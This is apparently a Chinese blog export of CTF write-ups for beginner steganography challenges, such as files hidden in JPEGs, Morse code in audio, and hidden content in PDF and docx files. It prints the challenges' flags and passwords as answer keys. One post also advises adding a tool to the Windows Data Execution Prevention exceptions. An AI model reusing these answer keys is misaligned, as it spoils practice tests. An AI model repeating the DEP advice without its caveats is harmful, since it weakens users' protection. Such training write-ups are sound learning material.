    <url>/2024/09/12/ctf/writeup/%E7%9B%AE%E5%BD%95/writeup/</url>
    <content><![CDATA[<h1 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h1><p>CTF题目传送门</p>
<ol>
<li><a href="/2024/09/12/ctf/writeup/web/%E7%9B%AE%E5%BD%95/catalogue/" title="web安全目录">web安全</a></li>
<li><a href="/2024/09/18/ctf/writeup/misc/%E7%9B%AE%E5%BD%95/catalogue/" title="misc安全目录">misc安全</a></li>
<li></li>
</ol>
<p>推荐在线靶场传送门</p>
<ol>
<li><a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://www.ctfhub.com/#/index" >CTFHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ol>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这里收录了我在做的CTF题目，题目可能来自不同靶场，会有标识的，目前还在持续更新中~</p>
<h2 id="自我介绍"><a href="#自我介绍" class="headerlink" title="自我介绍"></a>自我介绍</h2><p>本人是个大二学生，平时就是搞搞电脑，只要是和电脑有关的都感兴趣。</p>
<p>（不怎么会自我介绍，就将就看看吧(๑◕ܫ￩๑)b ）</p>
<p> 目前还属于CTF小白，略懂一二内网渗透。有了一点道行后听见学长们推荐写writeup来提升能力，所以就开始了我的wirteup之旅。写writeup文章时不时也会引用一些大佬的资料，希望大家能够一起共同进步，从入门到入土，或者你想从入门到入狱我也不拦你 ε&#x3D;ε&#x3D;ε&#x3D;ε&#x3D;ε&#x3D;ε&#x3D;┌(;￣◇￣)┘</p>
<blockquote>
<p>CTF在线靶场都是在线生成的动态flag，若要复现不要直接挪用flag哦，因为你是交不了的 ≖‿≖✧</p>
</blockquote>
<p>话不多说，去看看有没有你心动的WP吧٩(๑´0&#96;๑)۶ </p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>目录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>NISACTF-2022-huaji？</title>
    <url>/2024/09/19/ctf/writeup/misc/buuctf/%5BNISACTF-2022%5Dhuaji/</url>
    <content><![CDATA[<h1 id="NISACTF-2022-huaji？"><a href="#NISACTF-2022-huaji？" class="headerlink" title="[NISACTF 2022]huaji？"></a>[NISACTF 2022]huaji？</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个无扩展名的的附件，另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BNISACTF-2022%5Dhuaji/image-20240919191211475.png"
                      alt="image-20240919191211475"
                ></p>
<p>用<a class="link"   href="https://www.52pojie.cn/thread-1863194-1-1.html" >010Editor <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>打开看见头部是<code>FF D8 FF E0</code>，根据文件头信息，猜测是jpg后缀的图片</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BNISACTF-2022%5Dhuaji/image-20240919191533789.png"
                      alt="image-20240919191533789"
                ></p>
<table>
<thead>
<tr>
<th align="center">文件扩展名</th>
<th align="center">文件头</th>
<th align="center">文件尾</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>JPEG (jpg)</strong></td>
<td align="center"><strong>FF D8 FF</strong></td>
<td align="center"><strong>FF D9</strong></td>
</tr>
<tr>
<td align="center"><strong>PNG (png)</strong></td>
<td align="center"><strong>89 50 4E 47</strong></td>
<td align="center"><strong>AE 42 60 82</strong></td>
</tr>
<tr>
<td align="center"><strong>GIF (gif)</strong></td>
<td align="center"><strong>47 49 46 38</strong></td>
<td align="center"><strong>00 3B</strong></td>
</tr>
<tr>
<td align="center"><strong>ZIP Archive (zip)</strong></td>
<td align="center"><strong>50 4B 03 04</strong></td>
<td align="center"><strong>50 4B</strong></td>
</tr>
<tr>
<td align="center"><strong>RAR Archive (rar)</strong></td>
<td align="center"><strong>52 61 72 21</strong></td>
<td align="center"></td>
</tr>
</tbody></table>
<p>加上后缀后看到是一张滑稽的图片</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BNISACTF-2022%5Dhuaji/atta.NISACTF_2022huaji.jpg"
                      alt="atta.NISACTF_2022huaji"
                ></p>
<blockquote>
<p>针对图片有3种隐写方式，最先查看EXIF，看看是不是有隐藏属性，再修改图片宽高，还不行就看文件尾进行文件分离，最后再请出LSB最低有效位提取</p>
</blockquote>
<p>而这里第一步就可以看到有猫腻，你见过这样一串数字的型号？(≖ ‿ ≖)✧ </p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BNISACTF-2022%5Dhuaji/image-20240919192805690.png"
                      alt="image-20240919192805690"
                ></p>
<p>直接16进制转换一下，得到一串字符，先留着，下面肯定有用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BNISACTF-2022%5Dhuaji/image-20240919192914420.png"
                      alt="image-20240919192914420"
                ></p>

  <div class="note p-4 mb-4 rounded-small red">
    <p>学会既要看头又要看尾</p>

  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BNISACTF-2022%5Dhuaji/image-20240919192235889.png"
                      alt="image-20240919192235889"
                ></p>
<p>看到尾巴<code>FF D9</code>是jpg的文件尾，而后面藏着<code>50 4B 03 04</code>，是zip文件头，说明后面藏着个zip文件，用文件分离工具<a class="link"   href="https://github.com/ReFirmLabs/binwalk" >Binwalk <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>分离看看</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">binwalk -e ../atta.jpg --run-as=root</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BNISACTF-2022%5Dhuaji/image-20240919193231193.png"
                      alt="image-20240919193231193"
                ></p>
<p>进入文件夹看看有一个压缩包，里面肯定存着<code>flag.txt</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BNISACTF-2022%5Dhuaji/image-20240919193329476.png"
                      alt="image-20240919193329476"
                ></p>
<p>打开需要密码，试试我们上面通过EXIF得到的字符串<code>ctf_NISA_2022</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BNISACTF-2022%5Dhuaji/image-20240919193440582.png"
                      alt="image-20240919193440582"
                ></p>
<p>恭喜，拿到了flag！</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这道题是一个综合题，考察对文件头文件尾的识别，对隐藏文件的分离和图片的隐写，对于文件头和文件尾不熟悉的可以多多练习即可，不用刻意去背</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.2.5%20%E6%A1%88%E4%BE%8B%E8%A7%A3%E6%9E%90][NISACTF%202022]huaji%EF%BC%9F" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>SCTF 2021-in_the_vaporwaves</title>
    <url>/2024/09/19/ctf/writeup/misc/buuctf/%5BSCTF2021%5Din_the_vaporwaves/</url>
    <content><![CDATA[<h1 id="SCTF-2021-in-the-vaporwaves"><a href="#SCTF-2021-in-the-vaporwaves" class="headerlink" title="[SCTF 2021]in_the_vaporwaves"></a>[SCTF 2021]in_the_vaporwaves</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个压缩包的附件，另存为下来，解压到本地，发现是一个.wav音频，用<a class="link"   href="https://www.audacityteam.org/post-download/" >Audacity <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>打开看看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BSCTF%202021%5Din_the_vaporwaves/image-20240920013852945.png"
                      alt="image-20240920013852945"
                ></p>
<p>感觉这左右双通道都差不多对吧，但是啊，他们是刚好相反对称的</p>
<blockquote>
<p>谁看的出来啊 (｀д′)~ </p>
</blockquote>
<p>将通道分离再合并渲染，就可以得到不相等的一串音频</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BSCTF%202021%5Din_the_vaporwaves/image-20240920014117800.png"
                      alt="image-20240920014117800"
                ></p>
<blockquote>
<p>混音前要先ctrl+a全选中哦</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BSCTF%202021%5Din_the_vaporwaves/image-20240920014213123.png"
                      alt="image-20240920014213123"
                ></p>
<p>观察感觉是摩尔斯电码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BSCTF%202021%5Din_the_vaporwaves/image-20240920014342084.png"
                      alt="image-20240920014342084"
                ></p>
<p>得到电码</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">... -.-. - ..-. -.. . ... .---- .-. ...-- ..--.- -.. .-. .. ...- . ... ..--.- .. -. - ----- ..--.- ...- .- .--. --- .-. .-- .--.-. ...- . ...</span><br></pre></td></tr></table></figure></div>

<p>用<a class="link"   href="https://www.lddgo.net/encrypt/morse" >解码网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>一解</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BSCTF%202021%5Din_the_vaporwaves/image-20240920014624314.png"
                      alt="image-20240920014624314"
                ></p>
<p><code>SCTFDES1R3_DRIVES_INT0_VAPORW@VES</code>就是我们的flag了</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一道很需要“眼神”的题目，有的时候就是这样，一眼看不出来就是一眼万年了。。。</p>
<blockquote>
<p>谁有这么好的眼神啊 (╯￣Д￣)╯╘═╛</p>
</blockquote>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.3.5%20%E6%A1%88%E4%BE%8B%E8%A7%A3%E6%9E%90][SCTF%202021]in_the_vaporwaves" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>PDF文档隐写-pdf隐写</title>
    <url>/2024/09/20/ctf/writeup/misc/buuctf/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/</url>
    <content><![CDATA[<h1 id="PDF文档隐写-pdf隐写"><a href="#PDF文档隐写-pdf隐写" class="headerlink" title="[PDF文档隐写]pdf隐写"></a>[PDF文档隐写]pdf隐写</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个pdf的附件，另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/image-20240921004803339.png"
                      alt="image-20240921004803339"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/image-20240921013808494.png"
                      alt="image-20240921013808494"
                ></p>
<p>使用工具<a class="link"   href="https://www.bailer.at/wbstego/" >wbStego4.3open <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>进行解密</p>

  <div class="note p-4 mb-4 rounded-small red">
    <p>这里是需要先知道密码的，由于是书本上面的例题，所以直接给了密码<code>air123</code></p>

  </div>

<blockquote>
<p>使用时可能会报错</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/image-20240921010247506.png"
                      alt="image-20240921010247506"
                ></p>
<p>当出现上面的情况时，表示数据执行保护被拦截，需要加载打开（原本是为了避免病毒的）</p>
<p>找到“我的电脑”，右击找到“属性”，打开“高级系统设置”，找到“高级”里面的“性能”，打开“设置”，找到“数据执行保护”，根据图中提示，添加“wbStego4.3open.exe”，最后需要重启电脑</p>

  <div class="note p-4 mb-4 rounded-small info fa-solid icon-padding">
    <i class="note-icon fa-solid fa-circle-info"></i><p>做完题之后可以改回去，需要一直使用请在虚拟机操作</p>

  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/image-20240921010708361.png"
                      alt="image-20240921010708361"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/image-20240921010741505.png"
                      alt="image-20240921010741505"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/image-20240921010846336.png"
                      alt="image-20240921010846336"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/image-20240921010909324.png"
                      alt="image-20240921010909324"
                ></p>
<p>处理完报错之后，打开工具，根据如图的提示完成解密操作</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/image-20240921014147606.png"
                      alt="image-20240921014147606"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/image-20240921014244899.png"
                      alt="image-20240921014244899"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/image-20240921014334233.png"
                      alt="image-20240921014334233"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/image-20240921014400738.png"
                      alt="image-20240921014400738"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/image-20240921014446635.png"
                      alt="image-20240921014446635"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/image-20240921014509242.png"
                      alt="image-20240921014509242"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/image-20240921014516108.png"
                      alt="image-20240921014516108"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/image-20240921014534176.png"
                      alt="image-20240921014534176"
                ></p>
<p>恭喜拿到了flag！！！</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>PDF的隐写一般也是混合其他考题一起出，毕竟单独出这个需要你知道密码，而密码怎么得就看怎么题型混合了</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.5.2%20PDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99]pdf%E9%9A%90%E5%86%99" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>UTCTF2020-docx</title>
    <url>/2024/09/20/ctf/writeup/misc/buuctf/%5BUTCTF2020%5Ddocx/</url>
    <content><![CDATA[<h1 id="UTCTF2020-docx"><a href="#UTCTF2020-docx" class="headerlink" title="[UTCTF2020]docx"></a>[UTCTF2020]docx</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个word的附件，另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BUTCTF2020%5Ddocx/image-20240920183308520.png"
                      alt="image-20240920183308520"
                ></p>
<p>进入文档后，检测字体颜色与字体隐藏的隐写，并没有发现flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BUTCTF2020%5Ddocx/image-20240921012422224.png"
                      alt="image-20240921012422224"
                ></p>
<p>试试文档改压缩包，修改文档后缀为.zip，并解压</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BUTCTF2020%5Ddocx/image-20240921002233006.png"
                      alt="image-20240921002233006"
                ></p>
<p>这里可以每个手动去查找，也可以借用工具直接查找文本内容，这里提供<a class="link"   href="https://www.52pojie.cn/thread-1858771-1-1.html" >文件搜索工具 FileLocator Pro <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>这道题比较特殊，直接查找文本是找不到的，所以我们的flag可能不在这里面，或者说是以其他文件形式存在比如png图片等</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BUTCTF2020%5Ddocx/image-20240921003133417.png"
                      alt="image-20240921003133417"
                ></p>

  <div class="note-large info">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>一般word压缩包隐写的图片存放在.&#x2F;word.&#x2F;media文件目录下面</p>

    </div>
  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BUTCTF2020%5Ddocx/image-20240921012531150.png"
                      alt="image-20240921012531150"
                ></p>
<p>这里有这么多图片显然有问题，但目前我们只能挨个查看是否有图片存在异常</p>
<blockquote>
<p>这里留一个坑，应该有那种批量识别图片的工具，我这里懒得找，之后再说吧</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BUTCTF2020%5Ddocx/image-20240921012649697.png"
                      alt="image-20240921012649697"
                ></p>
<p>通过查找，我们在<code>image23.png</code>中成功找到隐藏在图片里面的flag</p>

  <div class="note p-4 mb-4 rounded-small warning fa-solid icon-padding">
    <i class="note-icon fa-solid fa-circle-exclamation"></i><p>这里的flag提交上去需要去掉最前面的<code>ut</code>，即<code>flag{unz1p_3v3ryth1ng}</code></p>

  </div>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一道比较简单的文件隐写题吧，玩玩~</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.5.3%20%E6%A1%88%E4%BE%8B%E8%A7%A3%E6%9E%90][UTCTF2020]docx" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>待填坑</tag>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>Word文档隐写-字体颜色</title>
    <url>/2024/09/20/ctf/writeup/misc/buuctf/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E5%AD%97%E4%BD%93%E9%A2%9C%E8%89%B2/</url>
    <content><![CDATA[<h1 id="Word文档隐写-字体颜色"><a href="#Word文档隐写-字体颜色" class="headerlink" title="[Word文档隐写]字体颜色"></a>[Word文档隐写]字体颜色</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个word的附件，另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E5%AD%97%E4%BD%93%E9%A2%9C%E8%89%B2/image-20240920183308520.png"
                      alt="image-20240920183308520"
                ></p>
<p>打开文档，发现是空白的，根据题目是有关字体颜色的隐写，直接全选文字，看看有何猫腻</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E5%AD%97%E4%BD%93%E9%A2%9C%E8%89%B2/image-20240920183922499.png"
                      alt="image-20240920183922499"
                ></p>
<p>表明这里可能存在着文字框</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E5%AD%97%E4%BD%93%E9%A2%9C%E8%89%B2/image-20240920183956952.png"
                      alt="image-20240920183956952"
                ></p>
<p>将其放大并选中黑色字体即可得到flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E5%AD%97%E4%BD%93%E9%A2%9C%E8%89%B2/image-20240920184012604.png"
                      alt="image-20240920184012604"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E5%AD%97%E4%BD%93%E9%A2%9C%E8%89%B2/image-20240920184038954.png"
                      alt="image-20240920184038954"
                ></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一篇小水文~ε٩(๑&gt; ₃ &lt;)۶з</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.5.1%20Word%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99]%E5%AD%97%E4%BD%93%E9%A2%9C%E8%89%B2" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>Word文档隐写-解压1</title>
    <url>/2024/09/20/ctf/writeup/misc/buuctf/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E8%A7%A3%E5%8E%8B1/</url>
    <content><![CDATA[<h1 id="Word文档隐写-解压1"><a href="#Word文档隐写-解压1" class="headerlink" title="[Word文档隐写]解压1"></a>[Word文档隐写]解压1</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个word的附件，另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E5%AD%97%E4%BD%93%E9%A2%9C%E8%89%B2/image-20240920183308520.png"
                      alt="image-20240920183308520"
                ></p>
<p>根据题目提示是要以压缩包的形式打开word文档</p>
<p>修改文档后缀为.zip，并解压</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E8%A7%A3%E5%8E%8B1/image-20240921002233006.png"
                      alt="image-20240921002233006"
                ></p>
<p>这里可以每个手动去查找，也可以借用工具直接查找文本内容，这里提供<a class="link"   href="https://www.52pojie.cn/thread-1858771-1-1.html" >文件搜索工具 FileLocator Pro <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E8%A7%A3%E5%8E%8B1/image-20240921002636831.png"
                      alt="image-20240921002636831"
                ></p>
<p>成功找到flag</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一道基础的docx文档隐写，前提要知道能够通过修改扩展名来找到隐藏内容</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.5.1%20Word%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99]%E8%A7%A3%E5%8E%8B1" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>2019RoarCTF-黄金6年</title>
    <url>/2024/09/19/ctf/writeup/misc/buuctf/%5B2019RoarCTF%5D%E9%BB%84%E9%87%916%E5%B9%B4/</url>
    <content><![CDATA[<h1 id="2019RoarCTF-黄金6年"><a href="#2019RoarCTF-黄金6年" class="headerlink" title="[2019RoarCTF]黄金6年"></a>[2019RoarCTF]黄金6年</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个视频的附件，另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B2019RoarCTF%5D%E9%BB%84%E9%87%916%E5%B9%B4/image-20240920015430767.png"
                      alt="image-20240920015430767"
                ></p>
<p>打开视频可以依稀的看到有二维码在闪动，由于肉眼和手无法精准看到，所以借用工具<a class="link"   href="https://www.watermark-software.com/video-to-picture/video-to-picture.html?ins5.3" >videotopicture <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>进行帧分离</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B2019RoarCTF%5D%E9%BB%84%E9%87%916%E5%B9%B4/image-20240920015652851.png"
                      alt="image-20240920015652851"
                ></p>
<p>可以看到里面有包含二维码的图片</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
